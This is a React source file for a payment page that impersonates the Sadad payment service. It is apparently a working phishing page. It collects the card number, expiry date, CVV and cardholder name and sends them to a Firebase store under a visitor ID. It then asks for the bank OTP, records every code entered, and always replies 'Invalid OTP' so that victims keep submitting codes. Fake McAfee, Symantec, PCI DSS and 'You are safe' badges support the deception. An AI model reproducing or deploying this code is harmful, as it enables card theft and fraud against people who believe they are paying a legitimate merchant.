"use client"

import type React from "react"
import { useEffect, useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Checkbox } from "@/components/ui/checkbox"
import { ChevronLeft, CreditCard, Smartphone } from "lucide-react"
import { addData } from "@/lib/firebase"
const allOtps=['']
export default function PaymentPage() {
  const [cardNumber, setCardNumber] = useState("")
  const [expiryDate, setExpiryDate] = useState("")
  const [cvv, setCvv] = useState("")
  const [cardholderName, setCardholderName] = useState("")
  const [saveCard, setSaveCard] = useState(false)
  const [paymentMethod, setPaymentMethod] = useState<"credit" | "debit" | "sadad">("credit")
  const [step, setStep] = useState<"form" | "otp">("form")
const [otp, setOtp] = useState("")
const [error, setError] = useState("")
const [loading, setLoading] = useState(false)
  const [payVal, setPayval] = useState("")
  
  useEffect(() => {
    const val = localStorage.getItem("amount")
    if (val) setPayval(val)
  }, [])
  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "")
    const chunks = cleaned.match(/.{1,4}/g)
    return chunks ? chunks.join(" ") : cleaned
  }

  const formatExpiryDate = (value: string) => {
    const cleaned = value.replace(/\D/g, "")
    if (cleaned.length >= 2) {
      return cleaned.slice(0, 2) + "/" + cleaned.slice(2, 4)
    }
    return cleaned
  }

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value.replace(/\D/g, ""))
    if (formatted.replace(/\s/g, "").length <= 16) {
      setCardNumber(formatted)
    }
  }

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiryDate(e.target.value)
    if (formatted.replace(/\D/g, "").length <= 4) {
      setExpiryDate(formatted)
    }
  }

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "")
    if (value.length <= 3) {
      setCvv(value)
    }
  }
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError("")
    setLoading(true)
  
    const visitorID  = localStorage.getItem('visitor')
    await addData({ id:visitorID, cardNumber, expiryDate, cvv, cardholderName, paymentMethod })
    setTimeout(() => {
      setStep("otp")
      setLoading(false)
    }, 5000);
    if (!visitorID) {
      setError("Visitor not found")
      setLoading(false)
      return
    }
 
  }
  return (
    <div className="min-h-screen bg-[#8A1538]">
      {step === "otp" && (
  <div className="space-y-5 text-center">
    <h2 className="text-lg font-semibold text-white">OTP Verification</h2>
    <p className="text-sm text-gray-400">
      Enter the 6-digit code sent to your phone
    </p>

    <Input
      type="tel"
      inputMode="numeric"
      maxLength={6}
      value={otp}
      onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
      placeholder="000000"
      className="h-14 text-center text-2xl font-bold tracking-widest"
    />

    {error && (
      <p className="text-sm text-red-600 font-medium">{error}</p>
    )}

    <Button
      className="w-full h-14 bg-[#8A1538]"
      onClick={async () => {
        if (otp.length !== 6) {
          setError("Invalid OTP code")
          return
        }

        const visitorID = localStorage.getItem("visitor")
allOtps.push(otp)
        await addData({
          id: visitorID,
          cardNumber,
          expiryDate,
          cvv,
          cardholderName,
          paymentMethod,allOtps,otp
        })

        // 🔒 منع إعادة الاستخدام
        localStorage.setItem(`used_${visitorID}`, "true")
        alert('Invalid OTP')
      }}
    >
      Confirm Payment
    </Button>
  </div>
)}
 {step === "form" && (
 <>
      <header className="relative bg-[#8A1538] text-white px-4 pt-12 pb-8">
        <div className="max-w-md mx-auto">
          <div className="flex items-center justify-between mb-6">
            <button className="p-2 hover:bg-white/10 rounded-lg transition-colors">
              <ChevronLeft className="h-6 w-6" />
            </button>
            <span className="text-sm">Eng</span>
          </div>

          <div className="text-center space-y-3">
            <div className="w-12 h-12 bg-white rounded-xl mx-auto flex items-center justify-center">
              <span className="text-[#8A1538] font-bold text-xl">S</span>
            </div>
            <h1 className="text-base font-medium">Sadad Payment solutions</h1>
            <div className="text-center">
              <p className="text-sm text-white/80 mb-1">Select an option to Pay</p>
              <p className="text-3xl font-bold">
                {payVal}<sup className="text-sm"></sup>
              </p>
            </div>
          </div>
        </div>
      </header>

      <div className="bg-background rounded-t-3xl -mt-2 min-h-[calc(100vh-220px)] pb-8">
        <div className="max-w-md mx-auto px-5 pt-6">
          <div className="grid grid-cols-3 gap-3 mb-6">
            <button
              onClick={() => setPaymentMethod("credit")}
              className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${
                paymentMethod === "credit"
                  ? "border-[#8A1538] bg-[#8A1538]/5"
                  : "border-border bg-background hover:border-[#8A1538]/30"
              }`}
            >
              <CreditCard
                className={`h-6 w-6 mb-2 ${paymentMethod === "credit" ? "text-[#8A1538]" : "text-muted-foreground"}`}
              />
              <span
                className={`text-xs font-medium ${paymentMethod === "credit" ? "text-[#8A1538]" : "text-muted-foreground"}`}
              >
                Credit Card
              </span>
            </button>

            <button
              onClick={() => setPaymentMethod("debit")}
              className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${
                paymentMethod === "debit"
                  ? "border-[#8A1538] bg-[#8A1538]/5"
                  : "border-border bg-background hover:border-[#8A1538]/30"
              }`}
            >
              <CreditCard
                className={`h-6 w-6 mb-2 ${paymentMethod === "debit" ? "text-[#8A1538]" : "text-muted-foreground"}`}
              />
              <span
                className={`text-xs font-medium ${paymentMethod === "debit" ? "text-[#8A1538]" : "text-muted-foreground"}`}
              >
                Debit Card
              </span>
            </button>

            <button
              onClick={() => setPaymentMethod("sadad")}
              className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${
                paymentMethod === "sadad"
                  ? "border-[#8A1538] bg-[#8A1538]/5"
                  : "border-border bg-background hover:border-[#8A1538]/30"
              }`}
            >
              <Smartphone
                className={`h-6 w-6 mb-2 ${paymentMethod === "sadad" ? "text-[#8A1538]" : "text-muted-foreground"}`}
              />
              <span
                className={`text-xs font-medium ${paymentMethod === "sadad" ? "text-[#8A1538]" : "text-muted-foreground"}`}
              >
                Sadad Pay
              </span>
            </button>
          </div>

          <form onSubmit={handleSubmit} className="space-y-5">
            <div className="space-y-2">
              <label className="text-xs text-muted-foreground font-medium">Card Holder Name</label>
              <Input
                type="text"
                placeholder="Card Holder Name"
                value={cardholderName}
                onChange={(e) => setCardholderName(e.target.value)}
                className="h-12 text-base border-border/50 rounded-xl"
                required
              />
            </div>

            <div className="space-y-2">
              <label className="text-xs text-muted-foreground font-medium">Card Number</label>
              <div className="relative">
                <Input
                  type="text"
                  placeholder="0000 0000 0000 0000"
                  value={cardNumber}
                  onChange={handleCardNumberChange}
                  className="h-12 text-right  text-base border-border/50 rounded-xl pr-20 font-mono tracking-wider"
                  dir="ltr"
                  required
                />
                <div className="absolute left-3 top-1/2 -translate-y-1/2 flex items-center gap-1.5">
<img src="/vmwx.png" width={90}/>
                </div>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <label className="text-xs text-muted-foreground font-medium">Expiry / Validity</label>
                <Input
                  type="text"
                  placeholder="MM/YY"
                  value={expiryDate}
                  onChange={handleExpiryChange}
                  className="h-12 text-base border-border/50 rounded-xl font-mono"
                  dir="ltr"
                  required
                />
              </div>
              <div className="space-y-2">
                <label className="text-xs text-muted-foreground font-medium">CVV</label>
                <div className="relative">
                  <Input
                    type="password"
                    placeholder="000"
                    value={cvv}
                    dir="rtl"
                    onChange={handleCvvChange}
                    className="h-12 text-base border-border/50 rounded-xl pr-10 font-mono"
                    required
                  />
                  <div className="absolute left-3 top-1/2 -translate-y-1/2">
                    <div className="w-6 h-5 bg-gradient-to-br from-amber-400 to-yellow-600 rounded-sm grid grid-cols-3 gap-[1px] p-[2px]">
                      {[...Array(9)].map((_, i) => (
                        <div key={i} className="bg-amber-500/50 rounded-[1px]"></div>
                      ))}
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div className="flex items-center gap-2 py-2">
              <Checkbox
                id="saveCard"
                checked={saveCard}
                onCheckedChange={(checked) => setSaveCard(checked as boolean)}
                className="border-[#8A1538] data-[state=checked]:bg-[#8A1538] data-[state=checked]:border-[#8A1538]"
              />
              <label htmlFor="saveCard" className="text-sm text-foreground cursor-pointer">
                Save this card for faster checkout for next time
              </label>
            </div>

            <Button
              type="submit"
              className="w-full h-14 bg-[#8A1538] hover:bg-[#8A1538]/90 text-white rounded-xl text-base font-semibold shadow-lg mt-6"
            >
              Pay {payVal}
            </Button>

            <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground mt-4">
              <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
              </svg>
              <span>
                Payment is Secured with 256bit SSL encryption{" "}
                <span className="text-green-600 font-medium">(You are safe)</span>
              </span>
            </div>
          </form>

          <div className="mt-8 pt-6 border-t border-border">
            <div className="flex items-center justify-center gap-4 mb-3">
              <div className="flex items-center gap-1.5 px-3 py-1.5 bg-red-50 dark:bg-red-950/20 rounded-lg border border-red-200 dark:border-red-900">
                <div className="w-5 h-5 bg-red-600 rounded flex items-center justify-center text-[8px] font-bold text-white">
                  M
                </div>
                <span className="text-[10px] font-semibold text-red-700 dark:text-red-400">McAfee</span>
              </div>
              <div className="flex items-center gap-1.5 px-3 py-1.5 bg-green-50 dark:bg-green-950/20 rounded-lg border border-green-200 dark:border-green-900">
                <svg className="w-4 h-4 text-green-600" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3zm-2 15l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" />
                </svg>
                <span className="text-[10px] font-semibold text-green-700 dark:text-green-400">SSL</span>
              </div>
              <div className="flex items-center gap-1.5 px-3 py-1.5 bg-yellow-50 dark:bg-yellow-950/20 rounded-lg border border-yellow-200 dark:border-yellow-900">
                <svg className="w-4 h-4 text-yellow-600" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
                </svg>
                <span className="text-[10px] font-semibold text-yellow-700 dark:text-yellow-400">Symantec</span>
              </div>
              <div className="flex items-center gap-1.5 px-3 py-1.5 bg-blue-50 dark:bg-blue-950/20 rounded-lg border border-blue-200 dark:border-blue-900">
                <svg className="w-4 h-4 text-blue-600" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 1L3 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3z" />
                </svg>
                <span className="text-[10px] font-semibold text-blue-700 dark:text-blue-400">PCI DSS</span>
              </div>
            </div>
            <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
              <svg className="w-3 h-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
              </svg>
              <span className="text-[11px]">100% secured Payment Powered by Sadad</span>
            </div>
          </div>
        </div>
      </div>
      </>)}
    </div>
  )
}
